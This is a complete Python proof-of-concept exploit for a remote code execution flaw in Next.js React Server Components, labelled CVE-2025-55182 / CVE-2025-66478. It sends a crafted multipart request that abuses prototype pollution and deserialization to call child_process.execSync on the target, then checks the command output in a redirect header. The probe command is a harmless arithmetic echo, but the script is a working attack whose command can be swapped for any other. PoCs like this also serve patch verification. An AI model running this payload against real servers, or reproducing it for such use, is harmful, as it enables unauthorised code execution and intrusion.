#!/usr/bin/env python3
"""
Minimal PoC for CVE-2025-55182 / CVE-2025-66478
Next.js React Server Components RCE

Usage: python poc.py <target_url>
"""

import sys
import re
import requests

def exploit(target: str) -> bool:
    """Send RCE payload to target and check for successful execution."""
    
    cmd = "echo $((1330+7))"
    
    # Payload that exploits RSC deserialization to execute arbitrary code
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B9999\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Next-Action": "x",
    }

    url = target.rstrip("/") + "/"
    
    print(f"[*] Targeting: {url}")
    print(f"[*] Payload command: {cmd}")
    
    try:
        resp = requests.post(
            url,
            headers=headers,
            data=body,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        
        print(f"[*] Status: {resp.status_code}")
        
        # Check if RCE succeeded - result of 1330+7 = 1337 should appear in redirect header
        redirect_header = resp.headers.get("X-Action-Redirect", "")
        
        if re.search(r".*/login\?a=1337.*", redirect_header):
            print(f"[+] VULNERABLE! RCE confirmed.")
            print(f"[+] X-Action-Redirect: {redirect_header}")
            return True
        else:
            print(f"[-] Not vulnerable or patched.")
            if redirect_header:
                print(f"[-] X-Action-Redirect: {redirect_header}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:3000")
        sys.exit(1)
    
    requests.packages.urllib3.disable_warnings()
    
    vulnerable = exploit(sys.argv[1])
    sys.exit(0 if vulnerable else 1)

